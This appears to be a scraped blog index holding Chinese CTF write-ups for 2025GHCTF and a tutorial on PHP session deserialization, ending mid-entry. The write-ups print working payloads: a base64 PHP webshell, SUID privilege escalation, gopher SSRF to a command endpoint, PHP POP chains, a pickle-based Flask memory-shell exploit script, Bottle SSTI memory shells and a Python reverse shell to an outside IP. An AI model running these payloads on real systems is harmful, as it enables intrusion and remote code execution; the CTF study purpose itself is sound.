?action=run\u0026amp;input=echo%09PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=|base64%09-d\u0026gt;shell.php 蚁剑连接但是权限不够，看不了flag\nsuid提权试试\n1 2 3 4 5 6 7 8 9 10 find / -user root -perm -4000 -print 2\u0026gt;/dev/null /var/www/html/wc /bin/umount /bin/mount /bin/su /usr/bin/newgrp /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/chsh 这里有个wc,https://gtfobins.github.io/gtfobins/wc/#suid\n跟着打\n1 ./wc --files0-from \u0026#34;/flag\u0026#34; Goph3rrr 目录扫描出app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 @app.route(\u0026#39;/Login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): junk_code() if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) if username in users and users[username][\u0026#39;password\u0026#39;] == hashlib.md5(password.encode()).hexdigest(): return b64e(f\u0026#34;Welcome back, {username}!\u0026#34;) return b64e(\u0026#34;Invalid credentials!\u0026#34;) return render_template_string(\u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34;) @app.route(\u0026#39;/Gopher\u0026#39;) def visit(): url = request.args.get(\u0026#39;url\u0026#39;) if url is None: return \u0026#34;No url provided :)\u0026#34; url = urlparse(url) realIpAddress = socket.gethostbyname(url.hostname) if url.scheme == \u0026#34;file\u0026#34; or realIpAddress in BlackList: return \u0026#34;No (≧∇≦)\u0026#34; result = subprocess.run([\u0026#34;curl\u0026#34;, \u0026#34;-L\u0026#34;, urlunparse(url)], capture_output=True, text=True) return result.stdout @app.route(\u0026#39;/Manage\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def cmd(): if request.remote_addr != \u0026#34;127.0.0.1\u0026#34;: return \u0026#34;Forbidden!!!\u0026#34; if request.method == \u0026#34;GET\u0026#34;: return \u0026#34;Allowed!!!\u0026#34; if request.method == \u0026#34;POST\u0026#34;: return os.popen(request.form.get(\u0026#34;cmd\u0026#34;)).read() @app.route(\u0026#39;/app.py\u0026#39;) def download_source(): return send_file(__file__, as_attachment=True) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) Gopher路由打ssrf,Manage路由可以cmd传参读文件，直接读环境变量env\n造一个包让他的host=127.0.0.1\n1 2 3 4 5 6 POST /Manage HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 7 cmd=env 双重url编码\n1 2 打gopher格式：gopher://ip:port/_TCP/IP数据流，这里要是8000端口，而且不能是127.0.0.1 /Gopher?url=/gopher://127.0.0.2:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250AContent-Length%253A%25207%250A%250Acmd%253Denv Popppppp pop链构造\n找利用点\n1 2 3 4 5 6 7 8 9 10 11 class Mystery { public function __get($arg1) { array_walk($this, function ($day1, $day2) { $day3 = new $day2($day1); foreach ($day3 as $day4) { echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } }); } } 这里可以输出文件，构造/*就能读根目录\n__get方法用于从不可访问的属性读取数据或者不存在这个键触发，\n找到Philosopher中的hey键值是不存在的\n1 2 3 4 5 6 7 8 9 10 class Philosopher { public $fruit10; public $fruit11=\u0026#34;sr22kaDugamdwTPhG5zU\u0026#34;; public function __invoke() { if (md5(md5($this-\u0026gt;fruit11)) == 666) { return $this-\u0026gt;fruit10-\u0026gt;hey; } } } __invoke方法将对象调用为函数时触发，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Warlord { public $fruit4; public $fruit5; public $arg1; public function __call($arg1, $arg2) { $function = $this-\u0026gt;fruit4; return $function(); } public function __get($arg1) { $this-\u0026gt;fruit5-\u0026gt;ll2(\u0026#39;b2\u0026#39;); } } __call方法在对象上下文中调用不可访问的方法时触发\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Samurai { public $fruit6; public $fruit7; public function __toString() { $long = @$this-\u0026gt;fruit6-\u0026gt;add(); return $long; } public function __set($arg1, $arg2) { if ($this-\u0026gt;fruit7-\u0026gt;tt2) { echo \u0026#34;xxx are the best!!!\u0026#34;; } } } 这里这个add()函数不可访问\n找触发__toString\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class CherryBlossom { public $fruit1; public $fruit2; public function __construct($a) { $this-\u0026gt;fruit1 = $a; } function __destruct() { echo $this-\u0026gt;fruit1; } public function __toString() { $newFunc = $this-\u0026gt;fruit2; return $newFunc(); } } 链构造好了\n1 2 3 CherryBlossom __destruct()-\u0026gt;Samurai __toString()-\u0026gt;Warlord __call-\u0026gt;Philosopher __invoke()-\u0026gt;Mystery __get() 更简单的链子 CherryBlossom __destruct()-\u0026gt;CherryBlossom __toString()-\u0026gt;Philosopher __invoke()-\u0026gt;Mystery __get() 中间有个双层MD5要爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php function findFruit11() { $chars = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; // 字符集 $length = 5; // 字符串长度 $maxAttempts = 1000000; // 最大尝试次数 $found = false; for ($i = 0; $i \u0026lt; $maxAttempts; $i++) { // 生成随机字符串 $fruit11 = \u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt; $length; $j++) { $fruit11 .= $chars[rand(0, strlen($chars) - 1)]; } // 计算两次 MD5 $hash1 = md5($fruit11); $hash2 = md5($hash1); // 检查是否以 666 开头 if (strpos($hash2, \u0026#39;666\u0026#39;) === 0) { echo \u0026#34;Found fruit11: $fruit11\\n\u0026#34;; echo \u0026#34;MD5(MD5(fruit11)): $hash2\\n\u0026#34;; $found = true; break; } } if (!$found) { echo \u0026#34;No valid fruit11 found after $maxAttempts attempts.\\n\u0026#34;; } } findFruit11(); ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php error_reporting(0); class CherryBlossom { public $fruit1; function __destruct() { echo $this-\u0026gt;fruit1; } } class Warlord { public $fruit4; public function __call($arg1, $arg2) { $function = $this-\u0026gt;fruit4; return $function(); } } class Samurai { public $fruit6; public function __toString() { $long = @$this-\u0026gt;fruit6-\u0026gt;add(); return $long; } } class Mystery { public $GlobIterator=\u0026#34;/*\u0026#34;; public function __get($arg1) { array_walk($this, function ($day1, $day2) { $day3 = new $day2($day1); foreach ($day3 as $day4) { echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } }); } } class Philosopher { public $fruit10; public $fruit11=\u0026#34;TuESw\u0026#34;; public function __invoke() { if (md5(md5($this-\u0026gt;fruit11)) == 666) { return $this-\u0026gt;fruit10-\u0026gt;hey; } } } $o=new CherryBlossom(); $o-\u0026gt;fruit1=new Samurai(); $o-\u0026gt;fruit1-\u0026gt;fruit6=new Warlord(); $o-\u0026gt;fruit1-\u0026gt;fruit6-\u0026gt;fruit4=new Philosopher(); $o-\u0026gt;fruit1-\u0026gt;fruit6-\u0026gt;fruit4-\u0026gt;fruit10=new Mystery(); echo urlencode(serialize($o)); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;?php error_reporting(0); class CherryBlossom { public $fruit1; public $fruit2; function __destruct() { echo $this-\u0026gt;fruit1; } public function __toString() { $newFunc = $this-\u0026gt;fruit2; return $newFunc(); } } class Mystery { public $GlobIterator=\u0026#34;/*\u0026#34;; public function __get($arg1) { array_walk($this, function ($day1, $day2) { $day3 = new $day2($day1); foreach ($day3 as $day4) { echo ($day4 . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } }); } } class Philosopher { public $fruit10; public $fruit11=\u0026#34;rSYwGEnSLmJWWqkEARJp\u0026#34;; public function __invoke() { if (md5(md5($this-\u0026gt;fruit11)) == 666) { return $this-\u0026gt;fruit10-\u0026gt;hey; } } } $o=new CherryBlossom(); $o-\u0026gt;fruit1=new CherryBlossom(); $o-\u0026gt;fruit1-\u0026gt;fruit2=new Philosopher(); $o-\u0026gt;fruit1-\u0026gt;fruit2-\u0026gt;fruit10=new Mystery(); echo urlencode(serialize($o)); 关键点在于public $GlobIterator=\u0026quot;/*\u0026quot;;变量名一定要是这个查询了一下这个变量可以替代glob()函数来目录遍历，类似的还有DirectoryIterator、FilesystemIterator要读取文件用glob://协议\n文件读取用SplFileObject，前面这些都是原生类\nezzzz_pickle 这题有非预期解，原因是docker-entrypoint.sh没删，而且存在任意文件读取，直接读就知道flag路径，然后再读flag就行\n上来先弱口令爆破admin/admin123\n看源码有注释\n在session的地方打pickle\n非预期就是在这里\n这个value值可以改，改个/etc/passwd可以读，那么我们直接读docker-entrypoint.sh\n然后就读出来了\n预期解\n正常是抓包改filename值但读不到flag,提示pickle那肯定有app.py\n转义小语句\n1 o = o.replace(\u0026#39;\u0026amp;#34;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;).replace(\u0026#39;\u0026amp;#39;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 from flask import Flask, request, redirect, make_response,render_template from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import padding import pickle import hmac import hashlib import base64 import time import os app = Flask(__name__) def generate_key_iv(): key = os.environ.get(\u0026#39;SECRET_key\u0026#39;).encode() iv = os.environ.get(\u0026#39;SECRET_iv\u0026#39;).encode() return key, iv def aes_encrypt_decrypt(data, key, iv, mode=\u0026#39;encrypt\u0026#39;): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()) if mode == \u0026#39;encrypt\u0026#39;: encryptor = cipher.encryptor() padder = padding.PKCS7(algorithms.AES.block_size).padder() padded_data = padder.update(data.encode()) + padder.finalize() result = encryptor.update(padded_data) + encryptor.finalize() return base64.b64encode(result).decode() elif mode == \u0026#39;decrypt\u0026#39;: decryptor = cipher.decryptor() encrypted_data_bytes = base64.b64decode(data) decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize() unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder() unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize() return unpadded_data.decode() users = { \u0026#34;admin\u0026#34;: \u0026#34;admin123\u0026#34;, } def create_session(username): session_data = { \u0026#34;username\u0026#34;: username, \u0026#34;expires\u0026#34;: time.time() + 3600 } pickled = pickle.dumps(session_data) pickled_data = base64.b64encode(pickled).decode(\u0026#39;utf-8\u0026#39;) key,iv=generate_key_iv() session=aes_encrypt_decrypt(pickled_data, key, iv,mode=\u0026#39;encrypt\u0026#39;) return session def dowload_file(filename): path=os.path.join(\u0026#34;static\u0026#34;,filename) with open(path, \u0026#39;rb\u0026#39;) as f: data=f.read().decode(\u0026#39;utf-8\u0026#39;) return data def validate_session(cookie): try: key, iv = generate_key_iv() pickled = aes_encrypt_decrypt(cookie, key, iv,mode=\u0026#39;decrypt\u0026#39;) pickled_data=base64.b64decode(pickled) session_data = pickle.loads(pickled_data) if session_data[\u0026#34;username\u0026#34;] !=\u0026#34;admin\u0026#34;: return False return session_data if session_data[\u0026#34;expires\u0026#34;] \u0026amp;gt; time.time() else False except: return False @app.route(\u0026#34;/\u0026#34;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def index(): if \u0026#34;session\u0026#34; in request.cookies: session = validate_session(request.cookies[\u0026#34;session\u0026#34;]) if session: data=\u0026#34;\u0026#34; filename=request.form.get(\u0026#34;filename\u0026#34;) if(filename): data=dowload_file(filename) return render_template(\u0026#34;index.html\u0026#34;,name=session[\u0026#39;username\u0026#39;],file_data=data) return redirect(\u0026#34;/login\u0026#34;) @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def login(): if request.method == \u0026#34;POST\u0026#34;: username = request.form.get(\u0026#34;username\u0026#34;) password = request.form.get(\u0026#34;password\u0026#34;) if users.get(username) == password: resp = make_response(redirect(\u0026#34;/\u0026#34;)) resp.set_cookie(\u0026#34;session\u0026#34;, create_session(username)) return resp return render_template(\u0026#34;login.html\u0026#34;,error=\u0026#34;Invalid username or password\u0026#34;) return render_template(\u0026#34;login.html\u0026#34;) @app.route(\u0026#34;/logout\u0026#34;) def logout(): resp = make_response(redirect(\u0026#34;/login\u0026#34;)) resp.delete_cookie(\u0026#34;session\u0026#34;) return resp if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;,debug=False) 上面有个aes加密，要获取key和iv,接下来就是打反序列化\n通过源码可以发现其session是通过pickle 序列化字典然后base64编码再AES加密在编码的结果，验证⽤\n户时session解码的过程也是base64解码AES解码base64解码pickle反序列化。那么我们只要能够获得\n这个加解密的key和iv就可以伪造出session从⽽控制pickle反序列化的内容，进⾏命令执行。\n⽽key和iv是从环境变量⾥读出来的。我们可以读取/proc/self/environ来得到key和iv。\n进而命令执行。因为⽆回显我们可以直接打内存马，或者弹shell或者写⽂件\n1 2 SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv SECRET_iv=asdwdggiouewhgpw 打内存马exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import os import requests import pickle import base64 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import padding def aes_encrypt_decrypt(data, key, iv, mode=\u0026#39;encrypt\u0026#39;): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()) if mode == \u0026#39;encrypt\u0026#39;: encryptor = cipher.encryptor() padder = padding.PKCS7(algorithms.AES.block_size).padder() padded_data = padder.update(data.encode()) + padder.finalize() result = encryptor.update(padded_data) + encryptor.finalize() return base64.b64encode(result).decode() elif mode == \u0026#39;decrypt\u0026#39;: decryptor = cipher.decryptor() encrypted_data_bytes = base64.b64decode(data) decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize() unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder() unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize() return unpadded_data.decode() class A(): def __reduce__(self): return (exec, (\u0026#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;shell\u0026#39;)).read()\u0026#34;,)) def exp(url): a = A() pickled = pickle.dumps(a) print(pickled) key = b\u0026#34;ajwdopldwjdowpajdmslkmwjrfhgnbbv\u0026#34; iv = b\u0026#34;asdwdggiouewhgpw\u0026#34; pickled_data = base64.b64encode(pickled).decode(\u0026#39;utf-8\u0026#39;) payload = aes_encrypt_decrypt(pickled_data, key, iv, mode=\u0026#39;encrypt\u0026#39;) print(payload) Cookie = {\u0026#34;session\u0026#34;: payload} request = requests.post(url, cookies=Cookie) print(request) if __name__ == \u0026#39;__main__\u0026#39;: url=\u0026#34;http://node6.anna.nssctf.cn:29184/\u0026#34; exp(url) 这里是触发404界面来getshell的\nEscape！ 源码审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $userData = checkSignedCookie(); if ($userData) { #echo $userData; $user=unserialize($userData); #var_dump($user); if($user-\u0026gt;isadmin){ $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); echo $tmp; if($_POST[\u0026#39;txt\u0026#39;]) { $content = \u0026#39;\u0026lt;?php exit; ?\u0026gt;\u0026#39;; $content .= $_POST[\u0026#39;txt\u0026#39;]; file_put_contents($_POST[\u0026#39;filename\u0026#39;], $content); } } else{ $tmp=file_get_contents(\u0026#34;tmp/admin.html\u0026#34;); echo $tmp; if($_POST[\u0026#39;txt\u0026#39;]||$_POST[\u0026#39;filename\u0026#39;]){ echo \u0026#34;\u0026lt;h1\u0026gt;权限不足，写入失败\u0026lt;h1\u0026gt;\u0026#34;; } } } else { echo \u0026#39;token验证失败\u0026#39;; } 这里首先反序列化，检查isadmin是不是true,然后POST传入的txt参数前面会拼接exit，可以用base64编码前面加a绕过，之前是aa,可能这题前面已经有字符导致的，这样不会解析a以及之前的字符，filename参数可以写入，我们用伪协议来写入\n1 filename=php://filter/convert.base64-decode/resource=/var/www/html/shell.php\u0026amp;txt=aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 但是这里要求admin账号用户\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function checkSignedCookie($cookieName = \u0026#39;user_token\u0026#39;, $secretKey = \u0026#39;fake_secretkey\u0026#39;) { // 获取 Cookie 内容 if (isset($_COOKIE[$cookieName])) { $token = $_COOKIE[$cookieName]; // 解码并分割数据和签名 $decodedToken = base64_decode($token); list($serializedData, $providedSignature) = explode(\u0026#39;|\u0026#39;, $decodedToken); // 重新计算签名 $calculatedSignature = hash_hmac(\u0026#39;sha256\u0026#39;, $serializedData, $secretKey); // 比较签名是否一致 if ($calculatedSignature === $providedSignature) { // 签名验证通过，返回序列化的数据 return $serializedData; // 反序列化数据 } else { // 签名验证失败 return false; } } return false; // 如果没有 Cookie } 由于不知道secret_key，不能伪造session来登入admin\nlogin的逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function setSignedCookie($serializedData, $cookieName = \u0026#39;user_token\u0026#39;, $secretKey = \u0026#39;fake_secretKey\u0026#39;) { $signature = hash_hmac(\u0026#39;sha256\u0026#39;, $serializedData, $secretKey); $token = base64_encode($serializedData . \u0026#39;|\u0026#39; . $signature); setcookie($cookieName, $token, time() + 3600, \u0026#34;/\u0026#34;); // 设置有效期为1小时 } $User=login($SQL,$username,$password); $User_ser=waf(serialize($User)); setSignedCookie($User_ser); header(\u0026#34;Location: dashboard.php\u0026#34;); ?\u0026gt; 这里用到先序列化再用waf检测\n1 2 3 4 5 6 7 8 9 function waf($c) { $lists=[\u0026#34;flag\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\\\u0026#34;,\u0026#34;sleep\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;||\u0026#34;,\u0026#34;\u0026amp;\u0026amp;\u0026#34;,\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;]; foreach($lists as $list){ $c=str_replace($list,\u0026#34;error\u0026#34;,$c); } #echo $c; return $c; } waf可以将字符串进行替换，长度会发生变化，能造成字符串逃逸\n每个flag被换成error会多一个字符，我们伪造\u0026quot;;s:7:\u0026quot;isadmin\u0026quot;;b:1;}\n前面拼接21个flag就能逃逸，传入username,然后就简单了\n1 2 3 4 5 6 7 8 str2=\u0026#39;\u0026#39; str1=\u0026#39;\u0026#39;\u0026#39;\u0026#34;;s:7:\u0026#34;isadmin\u0026#34;;b:1;}\u0026#39;\u0026#39;\u0026#39; length=len(str1) print(length) for i in range(length): str2+=\u0026#39;flag\u0026#39; str2+=str1 print(str2) 1 flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag\u0026#34;;s:7:\u0026#34;isadmin\u0026#34;;b:1;} 注册用户登入后写入shell,蚁剑连接\nMessage in a Bottle bottle框架过滤花括号\n可以用%来代替，但是%不能是第一个空白字符，所以在前面换行就行\n弹shell方式\n1 2 %__import__(\u0026#39;os\u0026#39;).popen(\u0026#34;python3 -c \u0026#39;import os,pty,socket;s=socket.socket();s.connect((\\\u0026#34;111.xxx.xxx.xxx\\\u0026#34;,7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\u0026#34;sh\\\u0026#34;)\u0026#39;\u0026#34;).read() 打内存马\n参考：文章 - SimpleTemplate 模板引擎ssti注入和内存马学习 - 先知社区\n奇安信攻防社区-探寻Bottle框架内存马\n这里利用自己造的路由的方式来打内存马,我们需要获取一下app就可以打了\n1 2 3 4 % from bottle import Bottle, request % app=__import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;] % app.route(\u0026#34;/shell\u0026#34;,\u0026#34;GET\u0026#34;,lambda :__import__(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;a\u0026#39;)).read()) Message in a Bottle plus 加了一堆waf还是黑盒，但是这次直接在%前面换行不行了，前面加引号就行了，还是打内存马\n1 2 3 4 5 \u0026#39;\u0026#39;\u0026#39; % from bottle import Bottle, request % app=__import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;] % app.route(\u0026#34;/shell\u0026#34;,\u0026#34;GET\u0026#34;,lambda :__import__(\u0026#39;os\u0026#39;).popen(request.params.get(\u0026#39;a\u0026#39;)).read()) \u0026#39;\u0026#39;\u0026#39; mydisk-1 第一个问题求登入密码\n账号信息在/etc/passwd里面，密码哈希存在/etc/shadow里面\n1 l0v3miku:$y$j9T$Me1sc6HllhxzlxG2YpNXi0$8oums.4ZpbnCsK0a.lmkodOFeCtpC2daRGLz.jAoKI0:20113:0:99999:7::: john+rockyou爆破\n第二个问题找定时任务\n查看/etc/crontab或者/var/log/cron.log 定时任务的日志中查看\n2分钟，去找这个a.py\n找到ip\n第三个是邮件\n这里有个foxmail导出然后爆破就行了\nmymem 我们工具扫出来是Win7SP1x64\n题目中提到了下载，我们用vol2命令filescan搜索Download下有哪些文件：\n","date":"2025-03-09T00:00:00Z","image":"https://0d000721999.github.io/p/2025ghctf%E5%A4%8D%E7%8E%B0/1.png","permalink":"https://0d000721999.github.io/p/2025ghctf%E5%A4%8D%E7%8E%B0/","title":"2025GHCTF复现"},{"content":"PHP session反序列化漏洞 会话开始之后，PHP 就会将会话中的数据设置到 $_SESSION 变量中，如下述代码就是一个在 $_SESSION 变量中注册变量的例子：\n1 2 3 4 5 6 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;username\u0026#39;])) { $_SESSION[\u0026#39;username\u0026#39;] = \u0026#39;xianzhi\u0026#39; ; } ?\u0026gt; 当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。\n默认情况下，PHP 使用内置的文件会话保存管理器来完成session的保存，也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项session.save_path所指定的位置。\nPHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的\nsession.serialize_handler定义的引擎有三种，如下表所示：\n处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 上述三种处理器中，php_serialize在内部简单地直接使用 serialize/unserialize函数，并且不会有php和 php_binary所具有的限制。 使用较旧的序列化处理器导致$_SESSION 的索引既不能是数字也不能包含特殊字符(| 和 !) 。\nphp 处理器 首先来看看session.serialize_handler等于 php时候的序列化结果，demo 如下：\n1 2 3 4 5 6 \u0026lt;?php error_reporting(0); ini_set(\u0026#39;session.serialize_handler\u0026#39;,\u0026#39;php\u0026#39;); session_start(); $_SESSION[\u0026#39;session\u0026#39;] = $_GET[\u0026#39;session\u0026#39;]; ?\u0026gt; 序列化的结果为：session|s:7:\u0026quot;xianzhi\u0026quot;;\nsession 为$_SESSION['session']的键名，|后为传入 GET 参数经过序列化后的值\nphp_binary处理器 再来看看session.serialize_handler等于 php_binary时候的序列化结果。\ndemo 如下：\n1 2 3 4 5 6 \u0026lt;?php error_reporting(0); ini_set(\u0026#39;session.serialize_handler\u0026#39;,\u0026#39;php_binary\u0026#39;); session_start(); $_SESSION[\u0026#39;sessionsessionsessionsessionsession\u0026#39;] = $_GET[\u0026#39;session\u0026#39;]; ?\u0026gt; 为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为#\n序列化的结果为：#sessionsessionsessionsessionsessions:7:\u0026quot;xianzhi\u0026quot;;\n#为键名长度对应的 ASCII 的值，sessionsessionsessionsessionsessions为键名，s:7:\u0026quot;xianzhi\u0026quot;;为传入 GET 参数经过序列化后的值\nphp_serialize 处理器 最后就是session.serialize_handler等于 php_serialize时候的序列化结果，同理，demo 如下：\n1 2 3 4 5 6 \u0026lt;?php error_reporting(0); ini_set(\u0026#39;session.serialize_handler\u0026#39;,\u0026#39;php_serialize\u0026#39;); session_start(); $_SESSION[\u0026#39;session\u0026#39;] = $_GET[\u0026#39;session\u0026#39;]; ?\u0026gt; 序列化的结果为：a:1:{s:7:\u0026quot;session\u0026quot;;s:7:\u0026quot;xianzhi\u0026quot;;}\na:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值\nbug 简单来说php处理器和php_serialize处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。\n形成的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。\n例子：\n定义一个session.php文件，用于传入 session值，文件内容如下：\n1 2 3 4 5 6 \u0026lt;?php error_reporting(0); ini_set(\u0026#39;session.serialize_handler\u0026#39;,\u0026#39;php_serialize\u0026#39;); session_start(); $_SESSION[\u0026#39;session\u0026#39;] = $_GET[\u0026#39;session\u0026#39;]; ?\u0026gt; 存在另一个class.php 文件，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php error_reporting(0); ini_set(\u0026#39;session.serialize_handler\u0026#39;,\u0026#39;php\u0026#39;); session_start(); class XianZhi{ public $name = \u0026#39;panda\u0026#39;; function __wakeup(){ echo \u0026#34;Who are you?\u0026#34;; } function __destruct(){ echo \u0026#39;\u0026lt;br\u0026gt;\u0026#39;.$this-\u0026gt;name; } } $str = new XianZhi(); ?\u0026gt; 这两个文件的作用很清晰，session.php文件的处理器是php_serialize，class.php文件的处理器是php，session.php文件的作用是传入可控的 session值，class.php文件的作用是在反序列化开始前输出Who are you?，反序列化结束的时候输出name值。\n这两个文件如果想要利用php bug #71101，我们要在session.php文件传入|+序列化格式的值，然后再次访问class.php文件的时候，就会在调用session值的时候，触发此 BUG。\n首先生成序列化字符串，利用 payload 如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php class XianZhi{ public $name; function __wakeup(){ echo \u0026#34;Who are you?\u0026#34;; } function __destruct(){ echo \u0026#39;\u0026lt;br\u0026gt;\u0026#39;.$this-\u0026gt;name; } } $str = new XianZhi(); $str-\u0026gt;name = \u0026#34;xianzhi\u0026#34;; echo serialize($str); ?\u0026gt; 此时的 session内容如下：\na:1:{s:7:\u0026quot;session\u0026quot;;s:44:\u0026quot;|O:7:\u0026quot;XianZhi\u0026quot;:1:{s:4:\u0026quot;name\u0026quot;;s:7:\u0026quot;xianzhi\u0026quot;;}\u0026quot;;}\n再次访问class.php文件的时候，就会发现已经触发了php bug #71101\n板子 1 2 3 4 5 \u0026lt;form action=\u0026#34;http://localhost/demo.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;\u0026lt;?php echo ini_get(\u0026#34;session.upload_progress.name\u0026#34;); ?\u0026gt;\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; ","date":"2025-03-06T00:00:00Z","image":"https://0d000721999.github.io/p/php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.jpg","permalink":"https://0d000721999.github.io/p/php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"PHP session反序列化漏洞"},{"content":"2025GHCTFwp baby_factor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 e = 65537 n = 